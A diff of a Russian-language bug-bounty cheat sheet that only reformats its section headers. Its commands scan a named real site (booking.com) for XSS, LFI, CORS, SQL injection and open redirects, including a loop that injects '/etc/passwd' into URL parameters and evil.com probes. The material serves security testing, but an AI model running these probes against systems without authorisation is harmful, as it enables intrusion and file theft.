@@ -13,22 +13,22 @@
 # из юрл извлекаем те юрл у которых есть параметры и js файлы 
 * cat urls.txt | grep "=" | tee param.txt
 * cat urls.txt | grep -iE '.js'| grep -ivE '.json' | sort -u | tee js.txt
-  _________________________________________ проверяет баги в js файлах _________________________________________
+# проверяет баги в js файлах 
 * nuclei -t /nuclei-templates/http/exposures/ -l js.txt -o jsBugs.txt
-  _________________________________________ проверяет xss _________________________________________
+# проверяет xss 
 * cat urls.txt | uro | gf xss > xss.txt
 * cat param.txt | kxss
 * paramspider -d booking.com
- _________________________________________ проверяет lfi _________________________________________
+# проверяет lfi 
 * cat aliveSubs.txt | gau | uro | gf lfi | tee lfi.txt
 * nuclei -l target.txt -tags lfi
 * cat aliveSubs.txt | gau | uro | gf lfi | qsreplace  "/etc/passwd" | while read url; do curl -silent "$url" | grep "root:x:" && echo "$url is Vulnerable"; done;
 * site=$(cat target.txt); gau $site | while read url; do target=$(curl -sIH Origin: https://evil.com -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found] echo $url; else echo Nothing on $url; fi; done
-  ________________________________________ проверяет sqli ________________________________________
+# проверяет sqli 
 * python3 sqlifinder.py -d booking.com
 * sqlmap -m param.txt --batch --random-agent --level 1 | tee sqlmap.txt
-  ______________________________________ проверяет открытое перенаправление _________________________________________
+# проверяет открытое перенаправление 
 * cat urls.txt | grep -a -i =http | qsreplace 'evil.com' | while read host do;do curl -s -L $host -I| grep evil.com && echo $host 3[0;31mVulnerable\n ;done
- _________________________________________ нуклей фазер проверет все уязвимости _________________________________________
+# нуклей фазер проверет все уязвимости _________________________________________
 * nf -d booking.com
 
